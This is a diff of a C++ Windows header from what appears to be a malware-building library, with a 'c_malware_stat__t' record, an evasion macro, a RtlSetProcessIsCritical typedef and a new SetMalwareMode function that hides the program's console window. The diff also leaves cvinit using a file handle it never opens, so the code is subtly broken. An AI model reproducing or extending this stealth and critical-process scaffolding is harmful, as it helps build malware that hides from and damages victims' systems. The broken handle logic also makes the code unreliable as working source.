@@ -6,10 +6,13 @@
 #define TCP 4
 #define UDP 5
 
-#define FUNCTION int x, int xx
+#define FUNCTION_EVADE int x
 #define KEEP_PID	0
 
 #define PAMAX	4000
+
+#define ON  0x01
+#define OFF 0x00
 
 #define _CRT_SECURE_NO_WARNINGS
 #define _CRT_NONSTDC_NO_DEPRECATE
@@ -29,7 +32,7 @@
 #include <psapi.h>
 #include <Tlhelp32.h>
 #include <Windows.h>
-#pragma comment(lib, "shlwapi.lib")
+#include <signal.h>
 
 // Accessing Some Functions From Different Namespaces.
 using		std::string;
@@ -37,8 +40,8 @@ using       	std::remove;
 
 // Custom Data Types And Typedefs
 
-typedef void (*function)(int, int);
-
+//typedef void (*function)(int);
+typedef __p_sig_fn_t function;
 typedef long (WINAPI* RtlSetProcessIsCritical)(
 			IN  BOOLEAN	bNew,
 			OUT BOOLEAN*	pbOld,
@@ -46,7 +49,7 @@ typedef long (WINAPI* RtlSetProcessIsCritical)(
 
 
 struct c_malware_stat__t{
-	char	name[256];
+	char	name[PAMAX];
 
 	size_t  size;
 };
@@ -61,26 +64,30 @@ struct c_malware_stat__t*	MALWARE;
 // Some Functions For Initializing The Library.
 void cvinit(int argc, char** argv){
 	HANDLE fh;
-	HWND wh;
 
 	_argv__=argv;
 	_argc__=argc;
 	MALWARE=&Current;
 
-	fh=CreateFile(argv[0], GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
 	Current.size=GetFileSize(fh, NULL);
 
-	strncpy(Current.name, argv[0], 256);
+	strncpy(Current.name, argv[0], PAMAX);
 
 	CloseHandle(fh);
 
-	AllocConsole();
-
-	wh=FindWindow("ConsoleWindowClass", NULL);
-	ShowWindow(wh, 0x00);
-
 	return;
+}
+
+void SetMalwareMode(int mode){
+	if (mode == ON){
+		HANDLE fh;
+		HWND   wh;
+
+		fh=CreateFile(_argv__[0], GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		AllocConsole();
+		wh=FindWindow("ConsoleWindowClass", NULL);
+		ShowWindow(wh, 0x00);
+	}
 }
 
 void cvexit(int x){
